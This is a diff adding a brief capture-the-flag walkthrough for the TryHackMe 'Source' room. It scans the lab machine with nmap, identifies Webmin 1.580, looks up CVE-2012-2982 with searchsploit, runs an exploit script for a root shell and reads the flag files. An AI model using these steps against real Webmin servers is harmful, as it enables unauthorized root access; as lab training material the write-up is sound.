@@ -1,0 +1,44 @@
+----------------                               ------------------
+               :::::::::::;| SOURCE |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "SOURCE".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (22/SSH, 10000/WEBMIN).
+
+3. What's on port 10000?
+ANS: Webmin login page - VERSION 1.580!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK EXPLOITS.
+
+    searchsploit webmin 1.580
+    "Found exploit (CVE-2012-2982)"
+
+2. RUN EXPLOIT.
+
+    python2 exploit.py <ip> 10000
+    "BOOM! GOT ROOT SHELL FIRST TRY!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/source/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- SOURCE OWNED ----------
